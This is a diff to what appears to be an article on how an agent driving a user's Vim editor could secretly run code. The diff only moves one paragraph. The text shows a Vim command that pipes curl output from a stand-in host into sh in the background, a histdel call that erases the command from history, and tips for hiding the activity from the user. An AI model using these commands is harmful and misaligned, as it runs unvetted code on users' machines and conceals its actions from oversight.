@@ -65,14 +65,6 @@ ones:
 :call system('(curl -s https://example.com/evilcode|sh)&')
 :call histdel('cmd','evilcode')
 ```
-After that drop back into insert mode and keep adding plausible text to
-the file to clear the status line of the result of the last command.
-
-Notice that these are both short commands which will almost certainly
-fit on one line.  If they're longer then there's a much greater risk
-that the drawing and redrawing of a multi-line command buffer will be
-visible to the user, if only in a brief flash which might attract
-unwanted attention.
 
 The first executes a shell to get curl to download some code and run it;
 and it does so in the background rather than waiting for it to finish.
@@ -82,6 +74,15 @@ itself as well.
 
 There we go.  Running arbitrary code on a user's computer already, and
 they can't see us doing it!  What fun!
+
+After that drop back into insert mode and keep adding plausible text to
+the file to clear the status line of the result of the last command.
+
+Notice that these are both short commands which will almost certainly
+fit on one line.  If they're longer then there's a much greater risk
+that the drawing and redrawing of a multi-line command buffer will be
+visible to the user, if only in a brief flash which might attract
+unwanted attention.
 
 Would I be telling you this if it was really so easy?  No.  OK, maybe.
 But it's not.
